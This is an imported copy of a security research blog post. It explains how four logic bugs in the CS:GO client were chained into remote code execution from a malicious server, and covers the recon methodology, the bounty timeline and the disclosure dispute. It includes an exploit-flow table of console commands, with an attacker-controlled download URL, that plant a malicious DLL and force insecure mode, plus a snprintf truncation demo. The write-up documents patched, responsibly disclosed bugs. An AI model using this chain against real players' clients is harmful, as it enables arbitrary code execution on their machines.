---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-05-13_csgo-from-zero-to-0-day.md
original_filename: 2023-05-13_csgo-from-zero-to-0-day.md
title: 'CS:GO: From Zero to 0-day'
category: documents
detected_topics:
- command-injection
- supply-chain
- sso
- access-control
- automation-abuse
- api-security
tags:
- imported
- documents
- command-injection
- supply-chain
- sso
- access-control
- automation-abuse
- api-security
language: en
raw_sha256: 9b177f02c6256a6c15bc0a91248d62201d4cdd14f35a64b0550a36ea88adeaac
text_sha256: 349943eb859f8df090aa2b03473daf34a7561424568cb6d4419eaa3d89e9daf5
ingested_at: '2026-06-28T07:32:21Z'
sensitivity: unknown
redactions_applied: false
---

# CS:GO: From Zero to 0-day

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-05-13_csgo-from-zero-to-0-day.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain, sso, access-control, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:21Z
- Redactions Applied: False
- Raw SHA256: `9b177f02c6256a6c15bc0a91248d62201d4cdd14f35a64b0550a36ea88adeaac`
- Text SHA256: `349943eb859f8df090aa2b03473daf34a7561424568cb6d4419eaa3d89e9daf5`


## Content

---
title: "CS:GO: From Zero to 0-day"
page_title: "CS:GO: From Zero to 0-day — Neodyme"
url: "https://neodyme.io/blog/csgo_from_zero_to_0day/"
final_url: "https://neodyme.io/en/blog/csgo_from_zero_to_0day/"
authors: ["Felipe", "Alain"]
programs: ["Valve (CS:GO)"]
bugs: ["Game hacking", "RCE", "Memory corruption", "Arbitrary file download", "Arbitrary file write", "DLL Hijacking", "Privilege escalation"]
bounty: "22,500"
publication_date: "2023-05-13"
added_date: "2023-05-15"
source: "pentester.land/writeups.json"
original_index: 1159
---

May 13, 2023 ~16 min read 

#  CS:GO: From Zero to 0-day 

![We identified three independent remote code execution \(RCE\) vulnerabilities in the popular Counter-Strike: Global Offensive game. Each vulnerability can be triggered when the game client connects to our malicious python CS:GO server. This post details our journey through the CS:GO binary and conducts a technical deep dive into various identified bugs. We conclude by presenting a proof of concept \(POC\) exploit that leverages four different logic bugs into remote code execution in the game's client, triggered when a client connects to the server.
](/_astro/csgo_wide.CEXhKhoj_Z2v1RGV.png)

Authored by: 

  * [Felipe](/en/blog/author/felipe)[](https://x.com/_localo_)[](https://www.linkedin.com/in/localo/)[](mailto:felipe@neodyme.io)
  * [Alain](/en/blog/author/alain)[](https://x.com/0x4d5aC)[](https://bsky.app/profile/0x4d5a.bsky.social)[](https://www.linkedin.com/in/alain-r%C3%B6del-27ab42272/)[](mailto:alain@neodyme.io)

## TL;DR¶

We identified three independent remote code execution (RCE) vulnerabilities in the popular Counter-Strike: Global Offensive game. Each vulnerability can be triggered when the game client connects to our malicious python CS:GO server. This post details our journey through the CS:GO binary and conducts a technical deep dive into various identified bugs. We conclude by presenting a proof of concept (POC) exploit that leverages four different logic bugs into remote code execution in the game’s client, triggered when a client connects to the server.

## Introduction¶

The [CS:GO patch dated 04/28/2021](https://blog.counter-strike.net/index.php/2021/04/33895/) fixed several critical vulnerabilities, including three critical bugs from us. This post describes our approach and how we discovered three critical vulnerabilities. We present a single bug chain, consisting of four logic bugs, and explain how these led to a remote code execution (RCE) on the client by cleverly combining them. Although the post does explain the four logic vulnerabilities, its focus is on the methodology of our research.

First we look at existing research for the CS:GO game and give a general introduction to make reverse engineering of the complex client less painful. The post then introduces basic concepts of the CS:GO network protocol like `fast_dl` and `Cvars` and detail four different logic bugs. Combining the bugs leads to the proof of concept that exploits a CS:GO client by only connecting to a malicous, attacker controlled server.

## CS:GO¶

The free-to-play game [Counter Strike: Global Offensive (CS:GO)](https://blog.counter-strike.net/) continues to experience great popularity with 21 million players per month, not least because of the wide variety of game modes offered by the many [community-hosted servers](https://www.gametracker.com/search/csgo/DE/). The game from 2012 is based on the even older [source engine (2004)](https://developer.valvesoftware.com/wiki/Source), known for games such as [Portal](https://en.wikipedia.org/wiki/Portal_\(video_game\)), [Half-Life 2](https://half-life.fandom.com/wiki/Half-Life_2) and [Left 4 Dead](https://left4dead.fandom.com/wiki/Left_4_Dead). The source engine in turn uses components from its predecessors, [GoldSrc (1998)](https://developer.valvesoftware.com/wiki/GoldSrc) and the [Quake engine (1996)](https://en.wikipedia.org/wiki/Quake_engine). This history already indicates that the powerful and complex source engine possesses some components, for which security did not yet stand in the foreground while programming.

The many game modes, community servers and modding support take a toll: a large attack surface. The many file formats such as textures, 3D models and AI navigation points go through a wide variety of parsers with completely attacker-controlled data as the data is shipped directly from the CS:GO server. In addition, the source engine implements its own TCP-like network stack based on UDP with all the associated problems in such a complex implementation. The network implementation has already been exploited in [other attacks](https://research.checkpoint.com/2020/game-on-finding-vulnerabilities-in-valves-steam-sockets/).

## Know your target¶

Security research is not about blindly poking around and looking for security gaps. Because: Only when you have fully understood a target, you are in a position to break through the technical restrictions. The first step should therefore be to obtain as much information about the target as possible. The following sections provide ideas for this “recon” phase:

### Software Development Kits¶

Games with modding support often provide an [official software development kit](https://developer.valvesoftware.com/wiki/SDK_Installation) (SDK). While the SDK does not contain the target’s source code, the structures defined there provide valuable information on [network packages](https://github.com/SteamDatabase/Protobufs) and class definitions that help to understand the engine. For Valve games in particular, there have also been several source code leaks of the engine or complete games (2003, 2007, and 2020). Although the source code is often outdated and contains many, now fixed, security holes, these leaks are very helpful. Mostly because source code is simply more pleasant to read than compiler-optimized assembly.

### Public Research¶

CS:GO is well known, thus we were not the first researchers looking for bugs in this game. Therefore, we searched the Internet for [helpful blogposts](https://phoenhex.re/2018-08-26/csgo-fuzzing-bsp) and [presentations](https://insomnihack.ch/wp-content/uploads/2017/04/AC_remote_exploitation_of_valve_source.pdf) at [conferences](https://www.youtube.com/watch?v=4weoWSzuCxs). The information described in this public research is often reduced to the essentials and makes it easier to find one’s way around a new, complex target.

### Cheating Communities¶

Super annoying in the game, loved by security researchers: Cheater communities like [UnknownCheats](https://unknowncheats.me) exist. These forums provide detailed reverse engineering posts and internals to the engine. In this case, Felipe had already written a [Network Cheat](https://www.youtube.com/watch?v=nn_hD1-Xe5Q) that contributed a lot to the understanding of the network protocol.

### Debug Symbols¶

Debug symbols contain the otherwise unrecognizable function names and class structures that make reverse engineering much more convenient. Sometimes versions of the game are also intentionally shipped with debug symbols to generate better error reports. However, sometimes programmers forget to remove the debug symbols from the final binaries of the game. Programmers are humans, and humans make mistakes.

![CS:GO Binary with Debug Symbols](/blog/csgo_from_zero_to_0day/symbols.png)

CS:GO Binary with Debug Symbols 

The CS:GO version for macOS from April 2017 (shown below) contained full debug symbols. Game files with symbols are many times larger than without and can therefore be identified automatically using [SteamDB](https://steamdb.info/app/730/depots/) and old repositories.
  
  
  2017-04-26T00:15:42+00:00 [M:8167272392035836136]
  
  csgo/bin/osx64/server.dylib (+9.30 MiB)
  
  bin/osx64/engine.dylib (+5.17 MiB)
  
  bin/osx64/scaleformui.dylib (+3.23 MiB)
  
  csgo/bin/osx64/client.dylib (+12.13 MiB)
  
  bin/osx64/materialsystem.dylib (+2.18 MiB)

While in 2021 it was still possible to specifically download old versions using `SteamCMD`, the feature seems to have been disabled by Valve in the meantime.

### Fuzzing¶

Despite all the information, you have to invest many hours in reverse engineering the target. Only once you have fully understood which buffer processes the network data in which virtual function with which arguments you can start doing exciting things. But the effort is worth it: we found instant client crashes using [Hongfuzz](https://github.com/google/honggfuzz), the [public protobuf network structures](https://github.com/SteamDatabase/Protobufs/tree/master/csgo), and [libprotobuf-mutator](https://github.com/google/libprotobuf-mutator). These crashes directly provided `instruction pointer` control and were thus very likely exploitable! To test the full extent and develop exploit strategies, we decided to implement our own early-stage server in Python.

## The discovery of four logic bugs¶

For a target like CS:GO, due to years of development and public bug bounty program, simple bugs are most likely fixed by now. If you are only looking for stack overflows in random methods of the huge `engine.dll`, you will quickly give up in frustration. But it is true: every little anomaly can prove to be valuable in combination with other gaps. During the weeks of staring at the CS:GO disassembly and source-code leaks, we constantly asked ourselves the following questions:

  * What primitives do we already have?
  * What can we do by combining them?
  * What security mechanisms are there?
  * What weird edge cases might a developer not have considered?

Memory corruption exploitation is hard. Although two of the three full-chain exploits submitted by us to Valve were memory corruptions, that meant extremely high overhead and always the risk that the client would crash because of an unfavorable memory allocation. Starting CS:GO and connecting to a server loading the map took several minutes each time, which made development very tough.

In this post, rather then explaining weird heap feng shui mechanisms, focus on four logic bugs that together led to our goal of remote code execution on the client. The order of discovery was as follows.

### Bug 1: Execution of privileged commands from the server¶

This bug allows the attacker to execute “privileged” commands on the client that usually only work in the single player mode 

To verify that our custom python CS:GO server is actually working, we sent the command `echo Hello World!` to the client via `CNETMsg_StringCmd` and, as expected, received the output `Hello World!` on the game console. Randomly, we also tried sending the `quit` command. And the game closed! We couldn’t believe that a server is allowed to do that. As it turns out, it is usually not allowed to do so: With the help of [SourceMod](https://www.sourcemod.net/), a source engine modding framework that can also send messages to the client, we recreated the same setup with an official and modded server. The result: `FCVAR_SERVER_CAN_EXECUTE prevented server running command: quit`. Did we find our entry bug? How exactly does the bug occur?

Source engine _single-player games_ internally use a locally hosted source engine server. The single-player client then connects to its own server to join the game. This single-player server should of course have far-reaching rights, e.g., to change the keyboard layout on the client or to take screenshots.

A _multi-player server_ is recognized as a local, and thus privileged, single player server if only a maximum of one client can connect to the server. The vulnerability is in the determination of the server type: The maximal number of clients that can connect to the server is controlled by the variable `m_nMaxClients` and is received by the client when connecting to a server. By chance, our Python server had set the variable `m_nMaxClients` to 1. And with this we could execute privileged commands on the client!

![Host_IsSinglePlayerGame Check](/blog/csgo_from_zero_to_0day/max_clients.png)

Host_IsSinglePlayerGame Check 

### Bug 2: Arbitrary file download due to extension stripping¶

This bug allows the attacker to download files with arbitrary file extensions, bypassing the extension filter 

Source engine servers can send additional game files such as maps or player models to the client. The data transfer can be done either via the source network protocol or HTTP `fast_dl`. To prevent malicious files from being sent to the client, certain file extensions like `*.exe`, `*.dll`, `*.ini` are blocked.

If the `fast_dl` option is set, additional content is loaded from a specified HTTP server rather then from the CS:GO server directly. The URL is dynamically generated from the server name and the full file name by the `snprintf(p_cResult, 256, "%s/%s", p_cServerName, p_cFileName)` function. The `snprintf` function limits the length of the resulting string to 256 characters, thus truncating unnecessary characters from the file name. But both `p_cServerName` and `p_cFileName` can have a length of 256 characters each! A file name like `././[..]/file.AAA.BBB` can be terminated specifically after the `.AAA` extension, as the `.BBB` part is truncated by the `snprintf` function. The filter for potentially dangerous files can thus be bypassed completely!

The following source snipped illustrates that the extension is stripped:
  
  
  #include <stdio.h>
  
  
  
  
  int main()
  
  {
  
  unsigned char p_cResult[32];
  
  
  
  
  // String fits into 32 byte and includes the `.bsp` part
  
  snprintf(p_cResult, 32, "%s/%s", "AAAAAAAAAAAAAAAA", "evil.dll.bsp");
  
  printf("%s\n", p_cResult); // Output: AAAAAAAAAAAAAAAA/evil.dll.bsp
  
  
  
  
  // Long enough string to truncate the `.bsp` part
  
  snprintf(p_cResult, 32, "%s/%s", "AAAAAAAAAAAAAAAAAAAAAA", "evil.dll.bsp");
  
  printf("%s\n", p_cResult); // Output: AAAAAAAAAAAAAAAAAAAAAA/evil.dll
  
  
  
  
  return 0;
  
  }

![Vulnerable snprintf function cuts remaining data from string](/blog/csgo_from_zero_to_0day/snprintf.png)

Vulnerable snprintf function cuts remaining data from string 

This vulnerability was found through code analysis of the `fast_dl` protocol, which has not changed much in recent years.

### Bug 3: Arbitrary text file write in game directory¶

This bug allows the attacker to (over)write arbitrary files in the game folder 

At this point, we were not sure how to combine the two previous bugs. Therefore, we searched the CS:GO binary for helpful privileged commands. With the `con_logfile` command, we surprisingly discovered that this command could write arbitrary `*.log` files to arbitrary game folders. Due to a similar extension stripping bug by `snprintf` it was also possible to specify an arbitrary file extension and thus write text files with arbitrary contents and an arbitrary extension.

Specifically, this bug could be used to create a new configuration file `cfg/leak.log` with arbitrary CS:GO commands. The `leak.log` “config” file could then the loaded by the `exec leak.log` command, reading the file from the `cfg` folder.

### Bug 4: Fallback to disabled signature checks¶

This bug allows the attacker to launch the CS:GO client in the “insecure” mode, allowing to load non-signed game binaries 

When starting the CS:GO client, the integrity of the game DLLs is verified via matching hash values. Only after this verification it is possible to play on official servers. If the DLL verification fails, a fallback to the `insecure` mode occurs. This can also be achieved by the additional command line argument `-insecure`. Only in this mode, additional DLLs not located in the `bin/` game path can be loaded. If the attacker succeeds in making the DLL verification fail, they can create their own DLLs, refer to these DLLs in the configuration and achieve command execution. On Windows, an attacker can specify code that is executed when the DLL is loaded into a process. Thus, the attacker can execute arbitrary code on the client system.

Windows prevents the overwriting of DLLs, which are loaded in a running process. Therefore, we had to find a DLL that is verified at game start but is not loaded into the process. Fortunately, we found that the `client.dll` had been replaced by the `client_panorama.dll` and is therefore no longer loaded, but is still verified! Overwriting `client.dll` with arbitrary text (bug 3) thus caused the verification to fail.

## Full logic bug chain¶

The full bug chain uses all four bugs to:

  1. execute privileged commands on the client
  2. download a malicious DLL to the game directory
  3. replace the `gameinfo.txt` so that the malicious DLL is loaded on game startup
  4. corrupt the `client.dll` to achieve a fallback to the `insecure` mode

To understand the following steps, we still need to introduce two elements typical for source engines: the `gameinfo.txt` and `CVars`:

### Gameinfo.txt¶

All source engine based games are actually “add-ons” to the basic Half-Life game. Assets and DLLs for the game are loaded from a special path defined in the file `gameinfo.txt`:
  
  
  "GameInfo"
  
  {
  
  game  "Counter-Strike: Global Offensive"
  
  title  "COUNTER-STRIKE'"
  
  title2  "GO"
  
  type multiplayer_only
  
  
  
  
  [ ...]
  
  
  
  
  FileSystem
  
  {
  
  SteamAppId  730  // This will mount all the GCFs we need (240=CS:S, 220=HL2).
  
  ToolsAppId  211
  
  SearchPaths
  
  {
  
  Game  |gameinfo_path|/exploit // NOTE: Added by our exploit
  
  Game  |gameinfo_path|.
  
  }
  
  }
  
  }

By setting `|gameinfo_path|/exploit` as first in the `FileSystem` array, the engine tries to load missing DLLs from this path. Only if the element to be loaded is not found there, the original game path is used. One DLL that is loaded at game start is `matchmaking.dll`. This means that we can place a new `matchmaking.dll` and invoke arbitrary code when the CS:GO client loads the DLL.

### CVars¶

`CVars` are a fundamental concept in SourceEngine games and appear everywhere. These variables control pretty much everything there is to set up in the game: paths, key-binds, the appearance of crosshairs, the game mode, etc. Also the legendary `sv_cheats` variable, which many Counter Strike players probably have already heard of, is a `CVar`. Depending on `CVar`, the settings can also be set by the server and thus override local options.

Upon **connecting** , the client tells the server which local `CVars` are set at the client, so that the server can react accordingly. For example, the server can kick the client if `sv_cheats` is set to `1` at the client. As an attacker, we need to know the installation directory from the CS:GO client so that we can exploit `bug 2` and `bug 4` by taking a path that is just the right length. Unfortunately, by default, the client does not send along a `CVar` that contains the current game directory. We therefore use a trick to set the new `CVAR GAMEBIN` and have it sent back to the attacker-controlled server. The basic idea:

  1. Execute a “script” `leak.log` to set the `CVar GAMEBIN`
  2. Instruct the client to reconnect to the malicious server
  3. Upon reconnection, all `CVars` and set back to the malicious server

The details involve invoking the `path` command from a config file to set the `CVAR GAMEBIN` to the installation path of the game. We leverage the attacker-written config file `leak.log`, which includes the `path` command. The client has to execute the config file, otherwise the `CVar` is not stored persistently during the next server connect. The `leak.log` file is executed with the `exec` command. Afterwards the malicous server instructs the client to reconnect. Upon reconnection, the `CVar` is leaked back to the server.

### Exploit flow¶

Component| Command| Result| Bug  
---|---|---|---  
![](/blog/csgo_from_zero_to_0day/client.svg)→![](/blog/csgo_from_zero_to_0day/server.svg)| `connect`| Client connects to malicious, attacker controlled server|  
![](/blog/csgo_from_zero_to_0day/server.svg)→![](/blog/csgo_from_zero_to_0day/client.svg)| `m_nMaxClients = 1`| The server can now execute privileged commands on the client| Bug 1  
![](/blog/csgo_from_zero_to_0day/server.svg)→![](/blog/csgo_from_zero_to_0day/client.svg)| `sv_downloadurl =  
http://<attacker-controlled>/`| The client has `fast_dl` http downloads enabled to download missing assets|  
![](/blog/csgo_from_zero_to_0day/server.svg)→![](/blog/csgo_from_zero_to_0day/client.svg)| `con_logfile cfg/leak.log  
path  
con_logfile disable  
exec leak.log`| The client executes the `path` command and stores the result in `GAMEBIN`|  
![](/blog/csgo_from_zero_to_0day/server.svg)→![](/blog/csgo_from_zero_to_0day/client.svg)| `reconnect`| The client reconnects and sends all `CVars` to the server, leaking the `GAMEBIN`. The server then creates the `downloadtables` with a precisely long filename size such that the extension is stripped| Bug 2  
![](/blog/csgo_from_zero_to_0day/client.svg)→![](/blog/csgo_from_zero_to_0day/server.svg)| `<fast_dl download code>`| The client downloads the malicious `exploit/bin/matchmaking.dll` and `gameinfo.txt` from the HTTP server| Bug 2  
![](/blog/csgo_from_zero_to_0day/server.svg)→![](/blog/csgo_from_zero_to_0day/client.svg)| `con_logfile ././././[…]/bin/client.dll.log`| The `bin/client.dll` is overwritten with a logfile entry (not a valid DLL anymore)| Bug 3  
![](/blog/csgo_from_zero_to_0day/server.svg)→![](/blog/csgo_from_zero_to_0day/client.svg)| `crash`| The client crashes. The user restarts the client.|  
![](/blog/csgo_from_zero_to_0day/client.svg)| `<startup>`| Invalid signature check for overwritten `bin/client.dll`.  
Fallback to`insecure` and load of overwritten `gameinfo.txt`| Bug 4  
![](/blog/csgo_from_zero_to_0day/client.svg)| `<startup>`| Search in `SearchPaths` for `matchmaking.dll` results in DLL found in `exploit/bin/matchmaking.dll`.  
`LoadLibraryA` of malicious, attacker controlled DLL and RCE|  
  
## Video¶

We provide a video of the above outlined chain of the four logic bugs (see below). If you stop the video at 00:29 seconds you can notice interesting output in the CS:GO console and in the exploit server:

  * The leaked `GAMEBIN: f:\spiele\steam\steamapps\common\couter-strike global offensive\csgo\bin` is retrieved from the exploit server
  * The CS:GO console shows the very long downloaded files, which succeed for the `././[..]/bin/matchmaking.dll.stf` `././[..]/gameinfo.txt.stf` files. As described above, the `.stf` extension is stripped during the download, resulting in the download of `matchmaking.dll` and `gameinfo.txt`.

## Closing Thoughts¶

Often people ask us how much time we spent on building this exploit chain. Unfortunately, we can not determine the total time spent. For weeks, we met on Discord in the evening to exchange ideas, programm together and analyze our findings until late in the morning. Alain at that time had roughly 250 hours of gameplay in CS:GO and had not played a single online match. We found the bugs “relatively” quickly, but for their bug bounty program, Valve requires a full-chain exploit demonstrating RCE impact. Without the elaborate demonstration, the research would have been completed after 30% of the time. Hence, we invested quite some time in our RCE demonstration.

Speaking of Valve: We became aware of Valve’s high payouts for CS:GO through [various](https://hackerone.com/reports/351014) and [simple looking](https://hackerone.com/reports/542180) HackerOne reports. The reports at the time only needed to demonstrate memory corruption to get the full payout. Our initial euphoria quickly sank after our three different reports were quickly declared valid, but still not fixed even after 13 months and multiple requests. After a lot of pressure and the threat of full disclosure, the bugs were finally fixed. The payout was 7.5k per bug, less than we expected. All in all a sobering experience.

For us the CS:GO bug bounty journey was the first time we invested weeks of time into a project together. The takeaways for us personally were mainly:

  * Don’t look for cricitial bugs and quick wins only.
  * Chain your bugs to unveal their full potential.
  * Keep your eyes open for edge cases and things devs didn’t think about.
  * Try harder! If run against a wall search for the hole and don’t give up early.

## Timeline¶

Date| Action  
---|---  
**01.03.2020**|  We send the initial Report with PoC video and exploit setup  
**01.03.2020**|  H1 has troubles to reproduce the issue  
**03.03.2020**|  We provide an exploit Docker setup for easier reproducability  
**06.03.2020**|  H1 still has troubles to reproduce the issue  
**21.03.2020**|  We provide a full server setup with OpenVPN for even easier reproducability  
**21.03.2020**|  H1 successfully reproduces the issue(s) and marks the report as triaged  
**01.06.2020**|  We ask for an update  
**03.06.2020**|  H1 states they are still looking into the report  
**18.09.2020**|  We ask for an update, as a total of half a year has passed by  
**22.10.2020**|  We ask again for an update  
**27.10.2020**|  H1 states that Valve is still looking into the reports  
**01.03.2021**|  We say “Happy Anniversary” and ask for an update  
**March 2021**|  We contact other researchers who submitted bugs to Valve and think about complaining in our reports as collective  
**22.04.2021**|  We write a statement about our dissatisfaction with the process and “reserve the right to disclose the findings in the upcoming weeks”  
**26.04.2021**|  H1 states that they flagged the report to “internal managers” and try to speed up the process  
**30.04.2021**|  We notice that the issues have been fixed and ask for coordinated disclosure with Valve  
**01.05.2021**|  H1 says “Thanks for the report” and we receive our bounty  
**29.03.2022**|  We request report disclosure, no response so far  
  
On this page

  1. TL;DR

  2. Introduction

  3. CS:GO

  4. Know your target

  1. Software Development Kits

  2. Public Research

  3. Cheating Communities

  4. Debug Symbols

  5. Fuzzing

  5. The discovery of four logic bugs

  1. Bug 1: Execution of privileged commands from the server

  2. Bug 2: Arbitrary file download due to extension stripping

  3. Bug 3: Arbitrary text file write in game directory

  4. Bug 4: Fallback to disabled signature checks

  6. Full logic bug chain

  1. Gameinfo.txt

  2. CVars

  3. Exploit flow

  7. Video

  8. Closing Thoughts

  9. Timeline

  * [Game Hacking](/en/blog/tag/game-hacking)
  * [RCE](/en/blog/tag/rce)

Share:
